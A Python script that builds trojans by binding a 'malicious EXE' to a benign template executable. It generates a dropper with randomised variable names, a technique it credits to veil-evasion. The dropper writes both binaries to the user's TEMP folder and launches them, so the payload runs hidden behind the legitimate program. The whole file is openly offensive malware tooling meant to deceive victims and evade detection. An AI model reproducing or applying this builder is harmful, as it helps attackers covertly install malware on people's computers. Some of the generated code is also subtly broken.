'''
Relatively simple binder intended to be incredibly lightweight. Assumes payload is already a compiled exe that will execute as a separate process. Provided the benefit of leaving the original executeable "intact", allowing it to pass any signature checks made at RUNTIME. Emphasis on RUNTIME.
'''

import base64, random, string, sys, os, argparse, re

parser = argparse.ArgumentParser(prog='simple_binder', usage=sys.argv[0] + ' [options]')
parser.add_argument('-t', "--template", type=str, help="Base EXE to use")
parser.add_argument('-m', "--virus", type=str, help="Malicious EXE to use")
parser.add_argument('-o', "--output", type=str, help="Output exe to write")
args = parser.parse_args()


if not args.template or not args.virus or not args.output:
	parser.print_help()
	exit()

template_file = args.template
virus_file = args.virus
output_file = args.output
output_filename = re.sub(".*\/", "", output_file)

# Totally stolen straight from veil-evasion
def randomString(length=-1):
	"""
	Returns random string of "length" characters.
	If no length is specified, resulting string is between 6 and 15 characters.
	"""
	if length == -1: length = random.randrange(6,16)
	random_string = ''.join(random.choice(string.ascii_letters) for x in  range(length))
	return random_string

# Get and encode the template file
with open(template_file, "rb") as templateOpen:
	encodedTemplate = base64.b64encode(templateOpen.read())

# Get and encode the malicious file
with open(virus_file, "rb") as virusOpen:
	encodedVirus = base64.b64encode(virusOpen.read())

def outputPrep():
	with open(output_file, "w+") as outputprePrep:
		outputprePrep.write("import base64\n")
		# randomize variable names
		base_exe_location = randomString()
		base_temp = randomString()
		base_encoded = randomString()
		virus_exe_location = randomString()
		virus_exe_name = randomString()
		virus_encoded = randomString()
		virus_temp = randomString()
		# write actual file
		outputprePrep.write("%s = \"%s\"\n" %(base_encoded,encodedTemplate))
		outputprePrep.write("%s = os.getenv('APPDATA') + \"\\..\\LOCAL\\TEMP\\%s\"\n" % (base_exe_location,output_filename))
		outputprePrep.write("with open(%s, 'wb+') as %s:\n" %(base_exe_location, base_temp))
		outputprePrep.write("\t%s.write(base64.b64decode(\"%s\"))\n" %(base_temp,base_encoded))
		outputprePrep.write("\t%s.close()\n\n" %(base_temp))
		outputprePrep.write("os.startfile(%s)\n" %(base_exe_location))
		outputprePrep.write("%s = os.getenv('APPDATA') + \"\\..\\LOCAL\\TEMP\\%s.exe\"\n" %(virus_exe_location,virus_exe_name))
		outputprePrep.write("%s = \"%s\"\n" %(virus_encoded,encodedVirus))
		outputprePrep.write("with open(%s, 'wb+') as %s:\n" %(virus_exe_location,virus_temp))
		outputprePrep.write("\t%s.write(base64.b64decode(\"%s\"))\n" %(virus_temp,encodedVirus))
		outputprePrep.write("\t%s.close()\n\n" %(virus_temp))
		outputprePrep.write("os.startfile(%s)\n" %(virus_exe_location))
		outputprePrep.write("exit()")
		outputprePrep.close()

outputPrep()
templateOpen.close()
virusOpen.close()

# let's build the actual malicious EXE
# os.system("wine32 \"C:\\Python27\python.exe\" /usr/share/pyinstaller/pyinstaller.py %s") % (output_file)
exit()

